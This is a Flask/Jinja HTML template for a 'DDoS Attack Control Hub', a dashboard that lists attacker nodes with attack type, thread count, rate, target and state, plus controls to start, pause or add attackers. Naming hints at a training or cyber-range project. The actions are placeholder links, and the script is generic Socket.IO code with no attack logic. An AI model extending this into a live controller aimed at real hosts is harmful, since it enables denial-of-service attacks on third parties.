{% extends 'mgmbase.html' %}

{% block title %} DDoS Attack Control Hub {% endblock %}

{% block style%}
<style>
  /* Make the image fully responsive 
  .carousel-inner img {
    width: 100%;
    height: 50%;
  }*/
</style>

{% endblock %}

{% block mgmContent %}

<div class="tab-content">
  <div class="tab-pane fade show active" id="pills-cr1-pro" role="tabpanel" aria-labelledby="pills-cr1-pro-tab">
      <div class="table-responsive">

          <table class="table table-dark">
              <thead>
                  <tr class="table table-danger">
                      <th>Attacker ID </th>
                      <th>DDoS Type </th>
                      <th>Thread Num </th>
                      <th>DDoS count/min </th>
                      <th>Start Time </th>
                      <th>Stop Time </th>
                      <th style="width:  10%">Target</th>
                      <th>Current State </th>
                      <th>last Update </th>
                      <th>Control </th>
                  </tr>
              </thead>
              <tbody>

                  {% for post in posts %}
                  <tr class="info">
                      <td> <b>{{ post['id'] }}</b> </td>
                      <td> {{ post['type'] }} </td>
                      <td> {{ post['threads'] }} </td>
                      <td> {{ post['count'] }} / min</td>
                      <td> <span class="badge badge-primary"> {{ post['startT'] }} </span> </td>
                      <td> <span class="badge badge-primary"> {{ post['endT'] }} </span> </td>
                      <td> {{ post['target'] }} </td>

                      <td>
                          {% if post['state'] == 0 %}
                              <span class="badge badge-success"> Pause </span>
                          {% else %}
                              <span class="badge badge-danger"> Attacking  </span>  <div class="spinner-border spinner-border-sm text-danger"></div>
                          {% endif %}
                      </td>

                      <td>
                        {{ post['updateT'] }}
                      </td>

                      <td>
                        <a href="#"> <span class="badge badge-danger"> Start </span></a>
                          <a href="#"> <span class="badge badge-warning"> Pause </span></a>
                      </td>
                  </tr>
                  {% endfor %}
              </tbody>
          </table>

      </div>
      <a href="#">
          <button type="button" class="btn btn-danger"> Start all attackers </button>
      </a>
      <a href="#">
        <button type="button" class="btn btn-warning"> Pause all attackers </button>
      </a>
      <a href="#">
          <button type="button" class="btn btn-success">[+] link to a new attacker </button>
      </a>
  </div>
  <div class="tab-pane fade" id="pills-cr1-res" role="tabpanel" aria-labelledby="pills-cr1-res-tab">...</div>
  <div class="tab-pane fade" id="pills-s17-cr2" role="tabpanel" aria-labelledby="pills-s17-cr2-tab">...</div>
</div>

<script>
  function toggleDiv(radioName) {
    document.getElementById("content_1").style.display = "none";
    document.getElementById("content_2").style.display = "none";
    document.getElementById("content_3").style.display = "none";
    if (radioName === "customRadio1") {
      document.getElementById("content_1").style.display = "block";
    } else if (radioName === "customRadio2") {
      document.getElementById("content_2").style.display = "block";
    } else if (radioName === "customRadio3") {
      document.getElementById("content_3").style.display = "block";
    }
  }

  // Add the following code if you want the name of the file appear on select
  $(".custom-file-input").on("change", function () {
    var fileName = $(this).val().split("\\").pop();
    $(this).siblings(".custom-file-label").addClass("selected").html(fileName);
  });

  $(document).ready(function () {
    // Connect to the Socket.IO server.
    // The connection URL has the following format, relative to the current page:
    //     http[s]://<domain>:<port>[/<namespace>]
    var socket = io();

    // Event handler for new connections.
    // The callback function is invoked when a connection with the
    // server is established.
    socket.on('connect', function () {
      socket.emit('cli_request', { data: 'I\'m connected!' });
    });

    // Event handler for server sent data.
    // The callback function is invoked whenever the server emits data
    // to the client. The data is then displayed in the "Received"
    // section of the page.
    socket.on('serv_response', function (msg, cb) {
      $('#log').append('<br>' + $('<div/>').text('Received #' + msg.count + ': ' + msg.data).html());
      if (msg.data == 'Downloading result...') {
        socket.emit('cli_request', { data: 'download' });
        document.getElementById('progspinner').style.display = "none";
        document.getElementById('startprocess').style.display = "block";
      }
      if (cb)
        cb();
    });

    socket.on('file_ready', function (data) {
      var blob = new Blob([data.content], { type: 'text/plain' });
      var url = URL.createObjectURL(blob);
      var link = document.createElement('a');
      link.href = url;
      link.download = data.filename + '.txt';
      link.click();
      URL.revokeObjectURL(link.href);
    })

    // Test response received from server is handled here
    socket.on('startprocess', function (msg) {
      $('#log').append('<br>' + $('<div/>').text(msg.data).html());
    })

    // Handlers for the different forms in the page.
    // These accept data from the user and send it to the server in a
    // variety of ways
    $('form#startprocess').submit(function (event) {
      document.getElementById('log').innerHTML = ""
      document.getElementById('progspinner').style.display = "block";
      document.getElementById('startprocess').style.display = "none";
      socket.emit('startprocess', { data: 'Start to process file' });

      return false;
    });
  });

</script>


{% endblock %}